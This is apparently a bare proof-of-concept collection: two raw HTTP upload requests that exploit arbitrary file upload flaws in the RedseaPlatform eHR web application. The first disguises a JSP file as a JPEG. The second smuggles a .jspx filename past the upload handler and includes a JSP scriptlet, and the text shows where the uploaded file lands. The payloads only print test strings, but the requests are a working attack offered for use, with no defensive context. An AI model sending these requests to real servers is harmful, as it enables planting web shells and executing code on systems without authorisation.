```

POST /RedseaPlatform/PtFjk.mob?method=upload HTTP/1.1
Host: x.x.x.x
Accept-Encoding: gzip
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryt7WbDl1tXogoZys4
Content-Length: 210

------WebKitFormBoundaryt7WbDl1tXogoZys4
Content-Disposition: form-data; name="fj_file"; filename="11.jsp"
Content-Type:image/jpeg

<% out.print("hello,eHR");%>
------WebKitFormBoundaryt7WbDl1tXogoZys4--

/uploadfile/2024/05/12/20240512_xxxxxx.jsp
```



poc2

```

POST /RedseaPlatform/kqFile.mob?method=uploadFile&fileName=123.jspx HTTP/1.1
Host: 
Pragma: no-cache
Cache-Control: no-cache
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36(KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflat
Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7
Cookie: JSESSIONID=391295A33F5DA2F1DB07485CEC9602E8
Connection: close
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryS7jL1beJUXUUnhE8
Content-Length: 395

------WebKitFormBoundaryS7jL1beJUXUUnhE8
Content-Disposition: form-data; name="fj_file";filename=|$|"222.jpg"|$|

<jsp:root version="2.0" xmlns:jsp="http://java.sun.com/JSP/Page">
<jsp:directive.page contentType="text/html"/>
<jsp:directive.page pageEncoding="UTF-8"/>
jsp:scriptlet<![CDATA[
out.print(123456);
]]></jsp:scriptlet>
</jsp:root>
------WebKitFormBoundaryS7jL1beJUXUUnhE8--
```

